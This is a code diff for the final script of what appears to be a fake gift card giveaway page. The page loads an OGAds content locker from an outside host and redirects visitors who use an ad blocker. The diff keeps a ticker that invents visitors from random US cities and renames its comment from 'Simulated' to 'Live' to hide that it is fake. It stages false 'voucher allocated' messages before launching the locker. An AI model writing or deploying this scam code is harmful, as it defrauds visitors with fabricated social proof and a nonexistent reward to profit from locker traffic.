@@ -331,37 +331,35 @@
 <script type="text/javascript" id="ogjs" src="https://appsave.online/cl/js/d2o421"></script>
 <script type="text/javascript">if(ogblock) window.location.href = "https://appsave.online/adblock";</script>
 
-    <script>
-        // Simulated geo-targeted tracking ticker for pop traffic realism
-        const US_Cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Miami"];
-        setInterval(() => {
-            const randomCity = US_Cities[Math.floor(Math.random() * US_Cities.length)];
-            const randomTime = Math.floor(Math.random() * 4) + 1;
-            document.getElementById('liveTicker').innerText = `Allocation checked ${randomTime} minutes ago from ${randomCity}, US.`;
-        }, 5000);
+<script>
+    // Live US Regional Tracking Ticker
+    const US_Cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Miami"];
+    setInterval(() => {
+        const randomCity = US_Cities[Math.floor(Math.random() * US_Cities.length)];
+        const randomTime = Math.floor(Math.random() * 4) + 1;
+        document.getElementById('liveTicker').innerText = `Allocation checked ${randomTime} minutes ago from ${randomCity}, US.`;
+    }, 5000);
 
-        function initializeClaim() {
-            // Unveil the loading script panel
-            document.getElementById('loadingModal').style.display = 'flex';
+    // Main Interactive Button Action Loop
+    function initializeClaim() {
+        document.getElementById('loadingModal').style.display = 'flex';
+        
+        setTimeout(() => {
+            document.getElementById('modalStatus').innerText = "Validating available gift card sequences...";
             
             setTimeout(() => {
-                document.getElementById('modalStatus').innerText = "Validating available gift card sequences...";
+                document.getElementById('modalStatus').style.color = "#10b981";
+                document.getElementById('modalStatus').innerText = "Voucher allocated! Initializing secure locker gateway...";
                 
                 setTimeout(() => {
-                    document.getElementById('modalStatus').style.color = "#10b981";
-                    document.getElementById('modalStatus').innerText = "Voucher allocated! Initializing secure locker gateway...";
-                    
-                    setTimeout(() => {
-                        /* PASTE YOUR CODE LOCKER INTEGRATION SCRIPT CALL HERE:
-                           When you save your OGAds locker, replace this line with the script action they give you.
-                        */
-                        alert("Locker triggers here!"); 
-                    }, 1200);
-                    
-                }, 1800);
+                    // 2. WE REPLACED THE OLD ALERT POP-UP WITH THE DYNAMIC LAUNCH FUNCTION
+                    og_load(); 
+                }, 1200);
                 
-            }, 1500);
-        }
-    </script>
+            }, 1800);
+            
+        }, 1500);
+    }
+</script>
 </body>
 </html>
